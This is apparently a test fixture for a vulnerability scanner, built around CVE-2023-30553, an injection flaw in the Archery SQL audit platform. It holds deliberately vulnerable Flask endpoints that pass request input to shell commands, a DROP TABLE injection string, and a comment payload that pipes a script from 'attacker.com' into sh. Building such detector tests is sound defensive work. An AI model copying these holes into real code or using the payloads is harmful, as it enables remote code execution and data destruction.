"""
CVE-2023-30553 — OS Command / SQL Injection in Archery SQL audit platform
Source: https://github.com/hhyo/Archery/security/advisories/GHSA-hvcq-r2r2-34ch
        https://nvd.nist.gov/vuln/detail/CVE-2023-30553
        GitHub Security Lab write-up: GHSL-2022-102

Affected: Archery (hhyo/Archery) v1.9.0
Vuln class: CWE-78 (OS Command Injection) / CWE-89 (SQL Injection via command channel)
Severity: CRITICAL

Description:
  Archery's ExecuteCheck REST endpoint accepts db_name and full_sql from the HTTP POST
  body and interpolates them directly into a privileged SQL command string sent to the
  GoInception backend engine. Any authenticated user can inject shell metacharacters
  or arbitrary SQL commands through the db_name field.

  Original vulnerable code (sql_api/api_workflow.py, Archery v1.9.0):
    class ExecuteCheck(APIView):
        def post(self, request):
            instance = serializer.get_instance()
            check_engine = get_engine(instance=instance)
            check_result = check_engine.execute_check(
                db_name=request.data["db_name"],     # <-- unsanitized
                sql=request.data["full_sql"].strip()  # <-- unsanitized
            )

  Original vulnerable sink (sql/engines/goinception.py):
    inception_sql = f\"""
    /*--user='{user}';--password='{password}';--host='{host}';--port={port};--check=1;*/
    inception_magic_start;
    use `{db_name}`;   <-- INJECTION POINT
    {sql.rstrip(';')};
    inception_magic_commit;\"""

  Exploit: POST db_name=legit_db`; DROP TABLE users;-- to bypass backtick quoting.

Flask adaptation (demonstrates same CWE-78 pattern with VEXIS-detectable sinks):
  Uses subprocess.run with shell=True to replicate the command injection class.
  request.form["db_name"] and request.form["full_sql"] flow into shell commands.
"""
import subprocess
import os
from flask import Flask, request, jsonify

app = Flask(__name__)


@app.route('/api/execute_check', methods=['POST'])
def execute_check():
    # CVE-2023-30553: db_name and sql from HTTP request body, no sanitization
    db_name = request.form.get('db_name', '')
    full_sql = request.form.get('full_sql', '').strip()

    # Vulnerable: db_name interpolated into shell command (same pattern as GoInception f-string)
    # Payload: db_name = "legit; curl http://attacker.com/shell.sh | sh"
    result = subprocess.run(
        f'mysql -h localhost -u root -e "USE {db_name}; {full_sql}"',
        shell=True,
        capture_output=True,
        text=True,
        timeout=30,
    )
    return jsonify({'stdout': result.stdout, 'stderr': result.stderr, 'returncode': result.returncode})


@app.route('/api/check_connection')
def check_connection():
    # Second vulnerable endpoint: host/port from user used in network command
    host = request.args.get('host', '')
    port = request.args.get('port', '3306')
    # Vulnerable: user-controlled host in shell command without sanitization
    exit_code = os.system(f'nc -z -w3 {host} {port}')
    return jsonify({'reachable': exit_code == 0})
